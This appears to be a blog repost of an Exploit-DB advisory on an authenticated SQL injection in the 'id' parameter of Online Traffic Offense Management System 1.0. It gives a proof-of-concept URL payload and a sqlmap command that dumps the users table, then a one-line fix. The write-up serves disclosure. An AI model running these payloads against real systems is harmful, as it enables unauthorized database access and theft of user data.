---
layout: post
title: Authenticated SQL Injection in Online Traffic Offense Management System 1.0
date: 2024-11-12 11:08 -0800
tag: [exploit-db]
category: [Vulnerability Research]
---

# Online Traffic Offense Management System 1.0 - 'id' SQL Injection (Authenticated)

**Exploit ID**: 50218  
**Author**: Justin White  
**Platform**: PHP  
**Date Published**: 2021-08-20  
**Vulnerable Application**: [Online Traffic Offense Management System 1.0](https://www.sourcecodester.com/php/14909/online-traffic-offense-management-system-php-free-source-code.html)

## Description

This vulnerability allows authenticated SQL Injection in the Online Traffic Offense Management System 1.0. By injecting SQL commands into the `id` parameter, attackers can access and manipulate the database.

## Vulnerable Parameters

- **id**: Located in `manage_driver` page.

## Proof of Concept (PoC)

To test this vulnerability, access the following URL:

`http://localhost/traffic_offense/admin/?page=drivers/manage_driver&id=4'--`

This input causes the application to throw errors, indicating that the `id` parameter is vulnerable to SQL Injection. You can also use `sqlmap` to automate the injection and retrieve data from the database.

``` bash
sqlmap -u "http://localhost/traffic_offense/admin/?page=drivers/manage_driver&id=4" --cookie="PHPSESSIONID=83ccd78474298cd9c3ad3def1f79f2ac" -D traffic_offense_db -T users --dump
```

## Vulnerable Code

The SQL query containing the `id` parameter is directly injectable. 

## Additional Information

- **Tested On**: Linux (Ubuntu 20.04) using LAMPP

## Remediation

Implement parameterized queries to ensure inputs are sanitized and SQL Injection is prevented.

[View this exploit on Exploit-DB](https://www.exploit-db.com/exploits/50218)
